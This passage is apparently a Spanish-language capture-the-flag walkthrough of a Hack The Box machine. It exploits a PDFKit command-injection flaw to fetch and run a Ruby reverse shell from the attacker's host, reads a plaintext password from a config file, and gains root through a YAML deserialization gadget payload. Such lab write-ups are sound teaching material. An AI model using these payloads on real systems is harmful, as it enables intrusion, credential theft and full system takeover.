fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@kali</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">file</span><span style="color:#B56959;--shiki-dark:#C3E88D"> response.bin</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # The response body is a PDF document</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">xdg-open</span><span style="color:#B56959;--shiki-dark:#C3E88D"> response.bin</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Open the document</span></span></code></pre> 
<p>El documento contiene el texto «¡Hello!», lo que es de esperar porque ese es el contenido que teníamos antes en nuestro sitio. Comprobando los metadatos del documento con exiftool, descubrimos que el campo Creador menciona que el documento se generó utilizando un producto identificado como PDFKit v0.8.6.</p>
<h2 id="cve-2022-25765">CVE-2022-25765</h2>
<p>Después de algunas investigaciones, determinamos que esta versión de pdfkit es vulnerable a CVE-2022-25765, lo que significa que potencialmente podríamos inyectar comandos del sistema operativo como se explica aquí. Intentemos explotar el bug para establecer una sesión de shell inversa con PwnCat. Usaremos una shell inversa escrita en Ruby porque sabemos que Ruby está instalado ya que PDFKit está escrito en Ruby.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@Kali</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">mkdir</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -p</span><span style="color:#B56959;--shiki-dark:#C3E88D"> share</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;&amp;</span><span style="color:#998418;--shiki-dark:#82AAFF"> cd</span><span style="color:#B56959;--shiki-dark:#C3E88D"> share</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">rb</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">require &#39;socket&#39;;spawn(&#39;sh&#39;,[:in,:out,:err]=&gt;TCPSocket.new(&#39;</span><span style="color:#B56959;--shiki-dark:#BABED8">$lhost</span><span style="color:#B56959;--shiki-dark:#C3E88D">&#39;,8443))</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">echo</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$rb</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> index.html</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Write ruby reverse shell to web index</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">python3</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -m</span><span style="color:#B56959;--shiki-dark:#C3E88D"> http.server</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --bind</span><span style="color:#B07D48;--shiki-dark:#BABED8"> $lhost</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 8080</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8">/dev/null </span><span style="color:#999999;--shiki-dark:#89DDFF">&amp;</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Serve payload</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">pwncat-cs</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -m</span><span style="color:#B56959;--shiki-dark:#C3E88D"> linux</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -l</span><span style="color:#B07D48;--shiki-dark:#BABED8"> $lhost</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 8443</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # PwnCat listener | Install: `pip3 install pwncat-cs`</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@Kali</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">curl</span><span style="color:#B56959;--shiki-dark:#C3E88D"> precious.htb</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -d</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">url=http://%2520%60curl%20</span><span style="color:#B56959;--shiki-dark:#BABED8">$lhost</span><span style="color:#B56959;--shiki-dark:#C3E88D">:8080|ruby%60</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Trigger payload</span></span></code></pre> 
<h1 id="privilege-escalation">Privilege Escalation</h1>
<h2 id="ruby">Ruby</h2>
<p>Nuestra sesión de shell inversa está en el contexto del usuario ruby. En el directorio principal de este usuario, encontramos el archivo ~/.bundle/config que contiene las credenciales potenciales</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># ruby@precious.htb (PwnCat)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">find</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ~</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -type</span><span style="color:#B56959;--shiki-dark:#C3E88D"> f</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # We find a configuration file of sorts</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">cat</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ~/.bundle/config</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Let&#39;s read it</span></span></code></pre> 
<p>El usuario henry, asociado con la contraseña Q3c1AqGHtoI0aXAYFH, también está presente en la máquina actual con la misma contraseña.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@Kali</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">pwncat-cs</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ssh://henry@precious.htb</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # password is Q3c1AqGHtoI0aXAYFH</span></span></code></pre> 
<h2 id="henry">Henry</h2>
<p>Como henry, podemos ejecutar un comando específico como root a través de sudo.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># henry@precious.htb (SSH)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">sudo</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -l</span></span></code></pre> 
<p>Echemos un vistazo a este script y veamos lo que hace.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># Compare installed dependencies with those specified in &quot;dependencies.yml&quot;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">require</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">yaml</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">require</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">rubygems</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># TODO: update versions automatically</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">def</span><span style="color:#B56959;--shiki-dark:#C3E88D"> update_gems</span><span style="color:#999999;--shiki-dark:#89DDFF">()</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">end</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">def</span><span style="color:#B56959;--shiki-dark:#C3E88D"> list_from_file</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    YAML.load(File.read(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">&quot;dependencies.yml&quot;</span><span style="color:#393A34;--shiki-dark:#BABED8">))</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">end</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">def</span><span style="color:#B56959;--shiki-dark:#C3E88D"> list_local_gems</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    Gem::Specification.sort_by</span><span style="color:#393A34;--shiki-dark:#BABED8">{ </span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">g</span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#999999;--shiki-dark:#89DDFF"> [</span><span style="color:#393A34;--shiki-dark:#BABED8">g.name.downcase, g.version</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8"> }.map{</span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">g</span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#999999;--shiki-dark:#89DDFF"> [</span><span style="color:#393A34;--shiki-dark:#BABED8">g.name, g.version.to_s</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8">}</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">end</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">gems_file</span><span style="color:#B56959;--shiki-dark:#C3E88D"> =</span><span style="color:#B56959;--shiki-dark:#C3E88D"> list_from_file</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">gems_local</span><span style="color:#B56959;--shiki-dark:#C3E88D"> =</span><span style="color:#B56959;--shiki-dark:#C3E88D"> list_local_gems</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">gems_file.each</span><span style="color:#B56959;--shiki-dark:#C3E88D"> do</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span><span style="color:#59873A;--shiki-dark:#FFCB6B">file_name,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> file_version</span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    gems_local.each</span><span style="color:#B56959;--shiki-dark:#C3E88D"> do</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span><span style="color:#59873A;--shiki-dark:#FFCB6B">local_name,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> local_version</span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">        if</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">file_name</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ==</span><span style="color:#B56959;--shiki-dark:#C3E88D"> local_name</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">            if</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">file_version</span><span style="color:#B56959;--shiki-dark:#C3E88D"> !=</span><span style="color:#B56959;--shiki-dark:#C3E88D"> local_version</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">                puts</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">Installed version differs from the one specified in file: </span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +</span><span style="color:#B56959;--shiki-dark:#C3E88D"> local_name</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">            else</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">                puts</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">Installed version is equals to the one specified in file: </span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +</span><span style="color:#B56959;--shiki-dark:#C3E88D"> local_name</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">            end</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">        end</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">    end</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">end</span></span></code></pre> 
<p>Este script no hace mucho más que llamar a YAML.load sobre el contenido del fichero dependencies.yml de nuestro directorio de trabajo. Al investigar las vulnerabilidades que afectan a YAML.load, descubrimos que no es seguro utilizarlo con datos suministrados por el usuario. También nos encontramos con este maravilloso post que describe una cadena de gadgets que potencialmente podríamos utilizar para ejecutar comandos como root. Vamos a modificar el comando dentro de la carga útil YAML del post para generar un shell interactivo de root</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">---</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">-</span><span style="color:#B56959;--shiki-dark:#C3E88D"> !ruby/object:Gem::Installer</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    i:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> x</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">-</span><span style="color:#B56959;--shiki-dark:#C3E88D"> !ruby/object:Gem::SpecFetcher</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    i:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> y</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">-</span><span style="color:#B56959;--shiki-dark:#C3E88D"> !ruby/object:Gem::Requirement</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  requirements:</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">    !</span><span style="color:#59873A;--shiki-dark:#FFCB6B">ruby/object:Gem::Package::TarReader</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    io:</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> !ruby/object:Net::BufferedIO</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">      io:</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> !ruby/object:Gem::Package::TarReader::Entry</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">         read</span><span style="color:#393A34;--shiki-dark:#BABED8">: </span><span style="color:#2F798A;--shiki-dark:#F78C6C">0</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">         header:</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">abc</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">      debug_output:</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> !ruby/object:Net::WriteAdapter</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">         socket:</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> !ruby/object:Gem::RequestSet</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">             sets:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> !ruby/object:Net::WriteAdapter</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">                 socket:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> !ruby/module</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">Kernel</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">                 method_id:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> :system</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">             git_set:</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">bash -pi</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">         method_id:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> :resolve</span></span></code></pre> 
<p>Ahora con el payload YAML dependencies.yml en nuestro directorio de trabajo, ejecutamos el script vulnerable con sudo</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># henry@precious.htb (SSH)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">sudo</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /usr/bin/ruby</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /opt/update_dependencies.rb</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # trigger the payload</span></span></code></pre> 
<p>El comando genera con éxito un intérprete de comandos raíz, desde el que podemos leer la bandera final en /root/root.txt.</p>
<h1 id="alternative-solution">Alternative Solution</h1>
<p>Otra forma en la que podríamos obtener la bandera raíz es utilizando el script en /opt/update_dependencies.rb para leer archivos a través de un enlace simbólico. Cuando el script busque dependencies.yml en el directorio de trabajo, encontrará un enlace simbólico plantado que apuntará a /root/root.txt. Cuando el script intente analizar el archivo como YAML, mostrará un error con el contenido del archivo.</p>
